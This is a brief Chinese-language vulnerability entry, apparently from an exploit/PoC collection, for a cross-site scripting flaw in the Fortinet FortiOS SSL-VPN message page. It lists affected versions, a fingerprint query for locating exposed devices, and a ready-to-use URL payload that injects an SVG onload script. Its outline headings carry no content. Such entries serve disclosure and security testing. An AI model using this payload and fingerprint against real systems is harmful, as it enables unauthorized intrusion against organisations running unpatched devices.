# FortinetFortiOSmessage存在xss漏洞

- **系统**：FortinetFortiOSmessage　|　**类型**：XSS　|　**CVE**：—
- **指纹**：`app="FORTINET-SSLVPN"`

**请求体 / payload**
```
/message?title=x&msg=%26%23<svg/onload=alert("xss")>;
```

**其他**
- Fortinet FortiOS message存在xss漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8